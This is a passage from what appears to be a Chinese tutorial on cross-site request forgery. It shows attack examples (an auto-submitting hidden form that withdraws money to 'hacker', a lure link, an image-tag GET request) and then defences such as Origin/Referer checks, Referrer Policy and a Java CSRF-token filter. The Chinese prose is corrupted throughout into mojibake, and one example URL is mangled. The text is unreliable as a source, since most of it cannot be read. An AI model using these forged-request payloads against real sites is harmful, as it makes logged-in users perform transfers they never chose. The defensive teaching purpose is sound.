åœ¨å—å®³è€…è®¿é—®å«æœ‰è¿™ä¸ªimgçš„é¡µé¢åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hackerå‘å‡ºä¸€æ¬¡HTTPè¯·æ±‚ã€‚bank.exampleå°±ä¼šæ”¶åˆ°åŒ…å«å—å®³è€…ç™»å½•ä¿¡æ¯çš„ä¸€æ¬¡è·¨åŸŸè¯·æ±‚ã€‚ POSTç±»å‹çš„CSRF è¿™ç§ç±»å‹çš„CSRFåˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œå¦‚ï¼š 123456 &lt;form action="http://bank.example/withdraw" method=POST&gt; &lt;input type="hidden" name="account" value="xiaoming" /&gt; &lt;input type="hidden" name="amount" value="10000" /&gt; &lt;input type="hidden" name="for" value="hacker" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡POSTæ“ä½œã€‚ POSTç±»å‹çš„æ”»å‡»é€šå¸¸æ¯”GETè¦æ±‚æ›´åŠ ä¸¥æ ¼ä¸€ç‚¹ï¼Œä½†ä»å¹¶ä¸å¤æ‚ã€‚ä»»ä½•ä¸ªäººç½‘ç«™ã€åšå®¢ï¼Œè¢«é»‘å®¢ä¸Šä¼ é¡µé¢çš„ç½‘ç«™éƒ½æœ‰å¯èƒ½æ˜¯å‘èµ·æ”»å‡»çš„æ¥æºï¼Œåç«¯æ¥å£ä¸èƒ½å°†å®‰å…¨å¯„æ‰˜åœ¨ä»…å…è®¸POSTä¸Šé¢ã€‚ é“¾æ¥ç±»å‹çš„CSRF é“¾æ¥ç±»å‹çš„CSRFå¹¶ä¸å¸¸è§ï¼Œæ¯”èµ·å…¶ä»–ä¸¤ç§ç”¨æˆ·æ‰“å¼€é¡µé¢å°±ä¸­æ‹›çš„æƒ…å†µï¼Œè¿™ç§éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ‰ä¼šè§¦å‘ã€‚è¿™ç§ç±»å‹é€šå¸¸æ˜¯åœ¨è®ºå›ä¸­å‘å¸ƒçš„å›¾ç‰‡ä¸­åµŒå…¥æ¶æ„é“¾æ¥ï¼Œæˆ–è€…ä»¥å¹¿å‘Šçš„å½¢å¼è¯±å¯¼ç”¨æˆ·ä¸­æ‹›ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä»¥æ¯”è¾ƒå¤¸å¼ çš„è¯è¯­è¯±éª—ç”¨æˆ·ç‚¹å‡»ï¼Œä¾‹å¦‚ï¼š 123&lt;a href="http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker" taget="_blank"&gt;é‡ç£…æ¶ˆæ¯ï¼ï¼&lt;a/&gt; ç”±äºä¹‹å‰ç”¨æˆ·ç™»å½•äº†ä¿¡ä»»çš„ç½‘ç«™Aï¼Œå¹¶ä¸”ä¿å­˜ç™»å½•çŠ¶æ€ï¼Œåªè¦ç”¨æˆ·ä¸»åŠ¨è®¿é—®ä¸Šé¢çš„è¿™ä¸ªPHPé¡µé¢ï¼Œåˆ™è¡¨ç¤ºæ”»å‡»æˆåŠŸã€‚ CSRFçš„ç‰¹ç‚¹ æ”»å‡»ä¸€èˆ¬å‘èµ·åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œè€Œä¸æ˜¯è¢«æ”»å‡»çš„ç½‘ç«™ã€‚è¢«æ”»å‡»çš„ç½‘ç«™æ— æ³•é˜²æ­¢æ”»å‡»å‘ç”Ÿã€‚ æ”»å‡»åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™çš„ç™»å½•å‡­è¯ï¼Œå†’å……å—å®³è€…æäº¤æ“ä½œï¼›è€Œä¸æ˜¯ç›´æ¥çªƒå–æ•°æ®ã€‚ æ•´ä¸ªè¿‡ç¨‹æ”»å‡»è€…å¹¶ä¸èƒ½è·å–åˆ°å—å®³è€…çš„ç™»å½•å‡­è¯ï¼Œä»…ä»…æ˜¯â€œå†’ç”¨â€ã€‚ è·¨ç«™è¯·æ±‚å¯ä»¥ç”¨å„ç§æ–¹å¼ï¼šå›¾ç‰‡URLã€è¶…é“¾æ¥ã€CORSã€Formæäº¤ç­‰ç­‰ã€‚éƒ¨åˆ†è¯·æ±‚æ–¹å¼å¯ä»¥ç›´æ¥åµŒå…¥åœ¨ç¬¬ä¸‰æ–¹è®ºå›ã€æ–‡ç« ä¸­ï¼Œéš¾ä»¥è¿›è¡Œè¿½è¸ªã€‚ CSRFé€šå¸¸æ˜¯è·¨åŸŸçš„ï¼Œå› ä¸ºå¤–åŸŸé€šå¸¸æ›´å®¹æ˜“è¢«æ”»å‡»è€…æŒæ§ã€‚ä½†æ˜¯å¦‚æœæœ¬åŸŸä¸‹æœ‰å®¹æ˜“è¢«åˆ©ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¯ä»¥å‘å›¾å’Œé“¾æ¥çš„è®ºå›å’Œè¯„è®ºåŒºï¼Œæ”»å‡»å¯ä»¥ç›´æ¥åœ¨æœ¬åŸŸä¸‹è¿›è¡Œï¼Œè€Œä¸”è¿™ç§æ”»å‡»æ›´åŠ å±é™©ã€‚ é˜²æŠ¤ç­–ç•¥CSRFé€šå¸¸ä»ç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·ï¼Œè¢«æ”»å‡»çš„ç½‘ç«™æ— æ³•é˜²æ­¢æ”»å‡»å‘ç”Ÿï¼Œåªèƒ½é€šè¿‡å¢å¼ºè‡ªå·±ç½‘ç«™é’ˆå¯¹CSRFçš„é˜²æŠ¤èƒ½åŠ›æ¥æå‡å®‰å…¨æ€§ã€‚ ä¸Šæ–‡ä¸­è®²äº†CSRFçš„ä¸¤ä¸ªç‰¹ç‚¹ï¼š CSRFï¼ˆé€šå¸¸ï¼‰å‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹åŸŸåã€‚ CSRFæ”»å‡»è€…ä¸èƒ½è·å–åˆ°Cookieç­‰ä¿¡æ¯ï¼Œåªæ˜¯ä½¿ç”¨ã€‚ é’ˆå¯¹è¿™ä¸¤ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸“é—¨åˆ¶å®šé˜²æŠ¤ç­–ç•¥ï¼Œå¦‚ä¸‹ï¼š é˜»æ­¢ä¸æ˜å¤–åŸŸçš„è®¿é—® åŒæºæ£€æµ‹ Samesite Cookie æäº¤æ—¶è¦æ±‚é™„åŠ æœ¬åŸŸæ‰èƒ½è·å–çš„ä¿¡æ¯ CSRF Token åŒé‡CookieéªŒè¯ ä»¥ä¸‹æˆ‘ä»¬å¯¹å„ç§é˜²æŠ¤æ–¹æ³•åšè¯¦ç»†è¯´æ˜ã€‚ åŒæºæ£€æµ‹æ—¢ç„¶CSRFå¤§å¤šæ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥ç¦æ­¢å¤–åŸŸï¼ˆæˆ–è€…ä¸å—ä¿¡ä»»çš„åŸŸåï¼‰å¯¹æˆ‘ä»¬å‘èµ·è¯·æ±‚ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªå¤–åŸŸå‘¢ï¼Ÿ åœ¨HTTPåè®®ä¸­ï¼Œæ¯ä¸€ä¸ªå¼‚æ­¥è¯·æ±‚éƒ½ä¼šæºå¸¦ä¸¤ä¸ªHeaderï¼Œç”¨äºæ ‡è®°æ¥æºåŸŸåï¼š Origin Header Referer Header è¿™ä¸¤ä¸ªHeaderåœ¨æµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¼šè‡ªåŠ¨å¸¦ä¸Šï¼Œå¹¶ä¸”ä¸èƒ½ç”±å‰ç«¯è‡ªå®šä¹‰å†…å®¹ã€‚ æœåŠ¡å™¨å¯ä»¥é€šè¿‡è§£æè¿™ä¸¤ä¸ªHeaderä¸­çš„åŸŸåï¼Œç¡®å®šè¯·æ±‚çš„æ¥æºåŸŸã€‚ ä½¿ç”¨Origin Headerç¡®å®šæ¥æºåŸŸååœ¨éƒ¨åˆ†ä¸CSRFæœ‰å…³çš„è¯·æ±‚ä¸­ï¼Œè¯·æ±‚çš„Headerä¸­ä¼šæºå¸¦Originå­—æ®µã€‚å­—æ®µå†…åŒ…å«è¯·æ±‚çš„åŸŸåï¼ˆä¸åŒ…å«pathåŠqueryï¼‰ã€‚ å¦‚æœOriginå­˜åœ¨ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨Originä¸­çš„å­—æ®µç¡®è®¤æ¥æºåŸŸåå°±å¯ä»¥ã€‚ ä½†æ˜¯Originåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹å¹¶ä¸å­˜åœ¨ï¼š IE11åŒæºç­–ç•¥ï¼š IE 11 ä¸ä¼šåœ¨è·¨ç«™CORSè¯·æ±‚ä¸Šæ·»åŠ Originæ ‡å¤´ï¼ŒRefererå¤´å°†ä»ç„¶æ˜¯å”¯ä¸€çš„æ ‡è¯†ã€‚æœ€æ ¹æœ¬åŸå› æ˜¯å› ä¸ºIE 11å¯¹åŒæºçš„å®šä¹‰å’Œå…¶ä»–æµè§ˆå™¨æœ‰ä¸åŒï¼Œæœ‰ä¸¤ä¸ªä¸»è¦çš„åŒºåˆ«ï¼Œå¯ä»¥å‚è€ƒMDN Same-origin_policy#IE_Exceptions 302é‡å®šå‘ï¼š åœ¨302é‡å®šå‘ä¹‹åOriginä¸åŒ…å«åœ¨é‡å®šå‘çš„è¯·æ±‚ä¸­ï¼Œå› ä¸ºOriginå¯èƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å…¶ä»–æ¥æºçš„æ•æ„Ÿä¿¡æ¯ã€‚å¯¹äº302é‡å®šå‘çš„æƒ…å†µæ¥è¯´éƒ½æ˜¯å®šå‘åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šçš„URLï¼Œå› æ­¤æµè§ˆå™¨ä¸æƒ³å°†Originæ³„æ¼åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šã€‚ ä½¿ç”¨Referer Headerç¡®å®šæ¥æºåŸŸåæ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå«Refererï¼Œè®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚ å¯¹äºAjaxè¯·æ±‚ï¼Œå›¾ç‰‡å’Œscriptç­‰èµ„æºè¯·æ±‚ï¼ŒRefererä¸ºå‘èµ·è¯·æ±‚çš„é¡µé¢åœ°å€ã€‚å¯¹äºé¡µé¢è·³è½¬ï¼ŒRefererä¸ºæ‰“å¼€é¡µé¢å†å²è®°å½•çš„å‰ä¸€ä¸ªé¡µé¢åœ°å€ã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨Refererä¸­é“¾æ¥çš„Originéƒ¨åˆ†å¯ä»¥å¾—çŸ¥è¯·æ±‚çš„æ¥æºåŸŸåã€‚ è¿™ç§æ–¹æ³•å¹¶éä¸‡æ— ä¸€å¤±ï¼ŒRefererçš„å€¼æ˜¯ç”±æµè§ˆå™¨æä¾›çš„ï¼Œè™½ç„¶HTTPåè®®ä¸Šæœ‰æ˜ç¡®çš„è¦æ±‚ï¼Œä½†æ˜¯æ¯ä¸ªæµè§ˆå™¨å¯¹äºRefererçš„å…·ä½“å®ç°å¯èƒ½æœ‰å·®åˆ«ï¼Œå¹¶ä¸èƒ½ä¿è¯æµè§ˆå™¨è‡ªèº«æ²¡æœ‰å®‰å…¨æ¼æ´ã€‚ä½¿ç”¨éªŒè¯ Referer å€¼çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠå®‰å…¨æ€§éƒ½ä¾èµ–äºç¬¬ä¸‰æ–¹ï¼ˆå³æµè§ˆå™¨ï¼‰æ¥ä¿éšœï¼Œä»ç†è®ºä¸Šæ¥è®²ï¼Œè¿™æ ·å¹¶ä¸æ˜¯å¾ˆå®‰å…¨ã€‚åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥éšè—ï¼Œç”šè‡³ä¿®æ”¹è‡ªå·±è¯·æ±‚çš„Refererã€‚ 2014å¹´ï¼ŒW3Cçš„Webåº”ç”¨å®‰å…¨å·¥ä½œç»„å‘å¸ƒäº†Referrer Policyè‰æ¡ˆï¼Œå¯¹æµè§ˆå™¨è¯¥å¦‚ä½•å‘é€Refereråšäº†è¯¦ç»†çš„è§„å®šã€‚æˆªæ­¢ç°åœ¨æ–°ç‰ˆæµè§ˆå™¨å¤§éƒ¨åˆ†å·²ç»æ”¯æŒäº†è¿™ä»½è‰æ¡ˆï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥çµæ´»åœ°æ§åˆ¶è‡ªå·±ç½‘ç«™çš„Refererç­–ç•¥äº†ã€‚æ–°ç‰ˆçš„Referrer Policyè§„å®šäº†äº”ç§Refererç­–ç•¥ï¼šNo Referrerã€No Referrer When Downgradeã€Origin Onlyã€Origin When Cross-originã€å’Œ Unsafe URLã€‚ä¹‹å‰å°±å­˜åœ¨çš„ä¸‰ç§ç­–ç•¥ï¼šneverã€defaultå’Œalwaysï¼Œåœ¨æ–°æ ‡å‡†é‡Œæ¢äº†ä¸ªåç§°ã€‚ä»–ä»¬çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š ç­–ç•¥åç§° å±æ€§å€¼ï¼ˆæ–°ï¼‰ å±æ€§å€¼ï¼ˆæ—§ï¼‰ No Referrer no-Referrer never No Referrer When Downgrade no-Referrer-when-downgrade default Origin Only (same or strict) origin origin Origin When Cross Origin (strict) origin-when-crossorigin - Unsafe URL unsafe-url always æ ¹æ®ä¸Šé¢çš„è¡¨æ ¼å› æ­¤éœ€è¦æŠŠReferrer Policyçš„ç­–ç•¥è®¾ç½®æˆsame-originï¼Œå¯¹äºåŒæºçš„é“¾æ¥å’Œå¼•ç”¨ï¼Œä¼šå‘é€Refererï¼Œrefererå€¼ä¸ºHostä¸å¸¦Pathï¼›è·¨åŸŸè®¿é—®åˆ™ä¸æºå¸¦Refererã€‚ä¾‹å¦‚ï¼šaaa.comå¼•ç”¨bbb.comçš„èµ„æºï¼Œä¸ä¼šå‘é€Refererã€‚ è®¾ç½®Referrer Policyçš„æ–¹æ³•æœ‰ä¸‰ç§ï¼š åœ¨CSPè®¾ç½® é¡µé¢å¤´éƒ¨å¢åŠ metaæ ‡ç­¾ aæ ‡ç­¾å¢åŠ referrerpolicyå±æ€§ ä¸Šé¢è¯´çš„è¿™äº›æ¯”è¾ƒå¤šï¼Œä½†æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªé—®é¢˜ï¼šæ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±çš„è¯·æ±‚ä¸­éšè—Refererã€‚å¦‚æœæ”»å‡»è€…å°†è‡ªå·±çš„è¯·æ±‚è¿™æ ·å¡«å†™ï¼š 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) é‚£ä¹ˆè¿™ä¸ªè¯·æ±‚å‘èµ·çš„æ”»å‡»å°†ä¸æºå¸¦Refererã€‚ å¦å¤–åœ¨ä»¥ä¸‹æƒ…å†µä¸‹Refereræ²¡æœ‰æˆ–è€…ä¸å¯ä¿¡ï¼š IE6ã€7ä¸‹ä½¿ç”¨window.location.href=urlè¿›è¡Œç•Œé¢çš„è·³è½¬ï¼Œä¼šä¸¢å¤±Refererã€‚ IE6ã€7ä¸‹ä½¿ç”¨window.openï¼Œä¹Ÿä¼šç¼ºå¤±Refererã€‚ HTTPSé¡µé¢è·³è½¬åˆ°HTTPé¡µé¢ï¼Œæ‰€æœ‰æµè§ˆå™¨Refereréƒ½ä¸¢å¤±ã€‚ ç‚¹å‡»Flashä¸Šåˆ°è¾¾å¦å¤–ä¸€ä¸ªç½‘ç«™çš„æ—¶å€™ï¼ŒRefererçš„æƒ…å†µå°±æ¯”è¾ƒæ‚ä¹±ï¼Œä¸å¤ªå¯ä¿¡ã€‚ æ— æ³•ç¡®è®¤æ¥æºåŸŸåæƒ…å†µå½“Originå’ŒRefererå¤´æ–‡ä»¶ä¸å­˜åœ¨æ—¶è¯¥æ€ä¹ˆåŠï¼Ÿå¦‚æœOriginå’ŒRefereréƒ½ä¸å­˜åœ¨ï¼Œå»ºè®®ç›´æ¥è¿›è¡Œé˜»æ­¢ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ‚¨æ²¡æœ‰ä½¿ç”¨éšæœºCSRF Tokenï¼ˆå‚è€ƒä¸‹æ–¹ï¼‰ä½œä¸ºç¬¬äºŒæ¬¡æ£€æŸ¥ã€‚ å¦‚ä½•é˜»æ­¢å¤–åŸŸè¯·æ±‚é€šè¿‡Headerçš„éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å‘èµ·è¯·æ±‚çš„æ¥æºåŸŸåï¼Œè¿™äº›æ¥æºåŸŸåå¯èƒ½æ˜¯ç½‘ç«™æœ¬åŸŸï¼Œæˆ–è€…å­åŸŸåï¼Œæˆ–è€…æœ‰æˆæƒçš„ç¬¬ä¸‰æ–¹åŸŸåï¼Œåˆæˆ–è€…æ¥è‡ªä¸å¯ä¿¡çš„æœªçŸ¥åŸŸåã€‚ æˆ‘ä»¬å·²ç»çŸ¥é“äº†è¯·æ±‚åŸŸåæ˜¯å¦æ˜¯æ¥è‡ªä¸å¯ä¿¡çš„åŸŸåï¼Œæˆ‘ä»¬ç›´æ¥é˜»æ­¢æ‰è¿™äº›çš„è¯·æ±‚ï¼Œå°±èƒ½é˜²å¾¡CSRFæ”»å‡»äº†å—ï¼Ÿ ä¸”æ…¢ï¼å½“ä¸€ä¸ªè¯·æ±‚æ˜¯é¡µé¢è¯·æ±‚ï¼ˆæ¯”å¦‚ç½‘ç«™çš„ä¸»é¡µï¼‰ï¼Œè€Œæ¥æºæ˜¯æœç´¢å¼•æ“çš„é“¾æ¥ï¼ˆä¾‹å¦‚ç™¾åº¦çš„æœç´¢ç»“æœï¼‰ï¼Œä¹Ÿä¼šè¢«å½“æˆç–‘ä¼¼CSRFæ”»å‡»ã€‚æ‰€ä»¥åœ¨åˆ¤æ–­çš„æ—¶å€™éœ€è¦è¿‡æ»¤æ‰é¡µé¢è¯·æ±‚æƒ…å†µï¼Œé€šå¸¸Headerç¬¦åˆä»¥ä¸‹æƒ…å†µï¼š 12Accept: text/htmlMethod: GET ä½†ç›¸åº”çš„ï¼Œé¡µé¢è¯·æ±‚å°±æš´éœ²åœ¨äº†CSRFçš„æ”»å‡»èŒƒå›´ä¹‹ä¸­ã€‚å¦‚æœä½ çš„ç½‘ç«™ä¸­ï¼Œåœ¨é¡µé¢çš„GETè¯·æ±‚ä¸­å¯¹å½“å‰ç”¨æˆ·åšäº†ä»€ä¹ˆæ“ä½œçš„è¯ï¼Œé˜²èŒƒå°±å¤±æ•ˆäº†ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„é¡µé¢è¯·æ±‚ï¼š 1GET https://example.com/addComment?comment=XXX&amp;dest=orderId æ³¨ï¼šè¿™ç§ä¸¥æ ¼æ¥è¯´å¹¶ä¸ä¸€å®šå­˜åœ¨CSRFæ”»å‡»çš„é£é™©ï¼Œä½†ä»ç„¶æœ‰å¾ˆå¤šç½‘ç«™ç»å¸¸æŠŠä¸»æ–‡æ¡£GETè¯·æ±‚æŒ‚ä¸Šå‚æ•°æ¥å®ç°äº§å“åŠŸèƒ½ï¼Œä½†æ˜¯è¿™æ ·åšå¯¹äºè‡ªèº«æ¥è¯´æ˜¯å­˜åœ¨å®‰å…¨é£é™©çš„ã€‚ å¦å¤–ï¼Œå‰é¢è¯´è¿‡ï¼ŒCSRFå¤§å¤šæ•°æƒ…å†µä¸‹æ¥è‡ªç¬¬ä¸‰æ–¹åŸŸåï¼Œä½†å¹¶ä¸èƒ½æ’é™¤æœ¬åŸŸå‘èµ·ã€‚å¦‚æœæ”»å‡»è€…æœ‰æƒé™åœ¨æœ¬åŸŸå‘å¸ƒè¯„è®ºï¼ˆå«é“¾æ¥ã€å›¾ç‰‡ç­‰ï¼Œç»Ÿç§°UGCï¼‰ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ç›´æ¥åœ¨æœ¬åŸŸå‘èµ·æ”»å‡»ï¼Œè¿™ç§æƒ…å†µä¸‹åŒæºç­–ç•¥æ— æ³•è¾¾åˆ°é˜²æŠ¤çš„ä½œç”¨ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼šåŒæºéªŒè¯æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„é˜²èŒƒæ–¹æ³•ï¼Œèƒ½å¤Ÿé˜²èŒƒç»å¤§å¤šæ•°çš„CSRFæ”»å‡»ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œå¯¹äºå®‰å…¨æ€§è¦æ±‚è¾ƒé«˜ï¼Œæˆ–è€…æœ‰è¾ƒå¤šç”¨æˆ·è¾“å…¥å†…å®¹çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å°±è¦å¯¹å…³é”®çš„æ¥å£åšé¢å¤–çš„é˜²æŠ¤æªæ–½ã€‚ CSRF Tokenå‰é¢è®²åˆ°CSRFçš„å¦ä¸€ä¸ªç‰¹å¾æ˜¯ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥çªƒå–åˆ°ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆCookieï¼ŒHeaderï¼Œç½‘ç«™å†…å®¹ç­‰ï¼‰ï¼Œä»…ä»…æ˜¯å†’ç”¨Cookieä¸­çš„ä¿¡æ¯ã€‚ è€ŒCSRFæ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºæœåŠ¡å™¨è¯¯æŠŠæ”»å‡»è€…å‘é€çš„è¯·æ±‚å½“æˆäº†ç”¨æˆ·è‡ªå·±çš„è¯·æ±‚ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¦æ±‚æ‰€æœ‰çš„ç”¨æˆ·è¯·æ±‚éƒ½æºå¸¦ä¸€ä¸ªCSRFæ”»å‡»è€…æ— æ³•è·å–åˆ°çš„Tokenã€‚æœåŠ¡å™¨é€šè¿‡æ ¡éªŒè¯·æ±‚æ˜¯å¦æºå¸¦æ­£ç¡®çš„Tokenï¼Œæ¥æŠŠæ­£å¸¸çš„è¯·æ±‚å’Œæ”»å‡»çš„è¯·æ±‚åŒºåˆ†å¼€ï¼Œä¹Ÿå¯ä»¥é˜²èŒƒCSRFçš„æ”»å‡»ã€‚ åŸç†CSRF Tokençš„é˜²æŠ¤ç­–ç•¥åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š 1. å°†CSRF Tokenè¾“å‡ºåˆ°é¡µé¢ä¸­ é¦–å…ˆï¼Œç”¨æˆ·æ‰“å¼€é¡µé¢çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦ç»™è¿™ä¸ªç”¨æˆ·ç”Ÿæˆä¸€ä¸ªTokenï¼Œè¯¥Tokené€šè¿‡åŠ å¯†ç®—æ³•å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¸€èˆ¬Tokenéƒ½åŒ…æ‹¬éšæœºå­—ç¬¦ä¸²å’Œæ—¶é—´æˆ³çš„ç»„åˆï¼Œæ˜¾ç„¶åœ¨æäº¤æ—¶Tokenä¸èƒ½å†æ”¾åœ¨Cookieä¸­äº†ï¼Œå¦åˆ™åˆä¼šè¢«æ”»å‡»è€…å†’ç”¨ã€‚å› æ­¤ï¼Œä¸ºäº†å®‰å…¨èµ·è§Tokenæœ€å¥½è¿˜æ˜¯å­˜åœ¨æœåŠ¡å™¨çš„Sessionä¸­ï¼Œä¹‹ååœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶ï¼Œä½¿ç”¨JSéå†æ•´ä¸ªDOMæ ‘ï¼Œå¯¹äºDOMä¸­æ‰€æœ‰çš„aå’Œformæ ‡ç­¾ååŠ å…¥Tokenã€‚è¿™æ ·å¯ä»¥è§£å†³å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œä½†æ˜¯å¯¹äºåœ¨é¡µé¢åŠ è½½ä¹‹ååŠ¨æ€ç”Ÿæˆçš„HTMLä»£ç ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡æœ‰ä½œç”¨ï¼Œè¿˜éœ€è¦ç¨‹åºå‘˜åœ¨ç¼–ç æ—¶æ‰‹åŠ¨æ·»åŠ Tokenã€‚ 2. é¡µé¢æäº¤çš„è¯·æ±‚æºå¸¦è¿™ä¸ªToken å¯¹äºGETè¯·æ±‚ï¼ŒTokenå°†é™„åœ¨è¯·æ±‚åœ°å€ä¹‹åï¼Œè¿™æ ·URL å°±å˜æˆ http://url?csrftoken=tokenvalueã€‚ è€Œå¯¹äº POST è¯·æ±‚æ¥è¯´ï¼Œè¦åœ¨ form çš„æœ€ååŠ ä¸Šï¼š 1&lt;input type=â€hiddenâ€ name=â€csrftokenâ€ value=â€tokenvalueâ€/&gt; è¿™æ ·ï¼Œå°±æŠŠTokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚äº†ã€‚ 3. æœåŠ¡å™¨éªŒè¯Tokenæ˜¯å¦æ­£ç¡® å½“ç”¨æˆ·ä»å®¢æˆ·ç«¯å¾—åˆ°äº†Tokenï¼Œå†æ¬¡æäº¤ç»™æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦åˆ¤æ–­Tokençš„æœ‰æ•ˆæ€§ï¼ŒéªŒè¯è¿‡ç¨‹æ˜¯å…ˆè§£å¯†Tokenï¼Œå¯¹æ¯”åŠ å¯†å­—ç¬¦ä¸²ä»¥åŠæ—¶é—´æˆ³ï¼Œå¦‚æœåŠ å¯†å­—ç¬¦ä¸²ä¸€è‡´ä¸”æ—¶é—´æœªè¿‡æœŸï¼Œé‚£ä¹ˆè¿™ä¸ªTokenå°±æ˜¯æœ‰æ•ˆçš„ã€‚ è¿™ç§æ–¹æ³•è¦æ¯”ä¹‹å‰æ£€æŸ¥Refereræˆ–è€…Originè¦å®‰å…¨ä¸€äº›ï¼ŒTokenå¯ä»¥åœ¨äº§ç”Ÿå¹¶æ”¾äºSessionä¹‹ä¸­ï¼Œç„¶ååœ¨æ¯æ¬¡è¯·æ±‚æ—¶æŠŠTokenä»Sessionä¸­æ‹¿å‡ºï¼Œä¸è¯·æ±‚ä¸­çš„Tokenè¿›è¡Œæ¯”å¯¹ï¼Œä½†è¿™ç§æ–¹æ³•çš„æ¯”è¾ƒéº»çƒ¦çš„åœ¨äºå¦‚ä½•æŠŠTokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚ã€‚ ä¸‹é¢å°†ä»¥Javaä¸ºä¾‹ï¼Œä»‹ç»ä¸€äº›CSRF Tokençš„æœåŠ¡ç«¯æ ¡éªŒé€»è¾‘ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // ä» session ä¸­å¾—åˆ° csrftoken å±æ€§String sToken = (String)s.getAttribute(â€œcsrftokenâ€); if(sToken == null)&#123; // äº§ç”Ÿæ–°çš„ token æ”¾å…¥ session ä¸­ sToken = generateToken(); s.setAttribute(â€œcsrftokenâ€,sToken); chain.doFilter(request, response); &#125; else&#123; // ä» HTTP å¤´ä¸­å–å¾— csrftoken String xhrToken = req.getHeader(â€œcsrftokenâ€); // ä»è¯·æ±‚å‚æ•°ä¸­å–å¾— csrftoken String pToken = req.getParameter(â€œcsrftokenâ€); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; chain.doFilter(request, response); &#125;else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(â€œerror.jspâ€).forward(request,response); &#125; &#125; ä»£ç æºè‡ªIBM developerworks CSRF è¿™ä¸ªTokençš„å€¼å¿…é¡»æ˜¯éšæœºç”Ÿæˆçš„ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢«æ”»å‡»è€…çŒœåˆ°ï¼Œè€ƒè™‘åˆ©ç”¨Javaåº”ç”¨ç¨‹åºçš„java.security.SecureRandomç±»æ¥ç”Ÿæˆè¶³å¤Ÿé•¿çš„éšæœºæ ‡è®°ï¼Œæ›¿ä»£ç”Ÿæˆç®—æ³•åŒ…æ‹¬ä½¿ç”¨256ä½BASE64ç¼–ç å“ˆå¸Œï¼Œé€‰æ‹©è¿™ç§ç”Ÿæˆç®—æ³•çš„å¼€å‘äººå‘˜å¿…é¡»ç¡®ä¿åœ¨æ•£åˆ—æ•°æ®ä¸­ä½¿ç”¨éšæœºæ€§å’Œå”¯ä¸€æ€§æ¥ç”Ÿæˆéšæœºæ 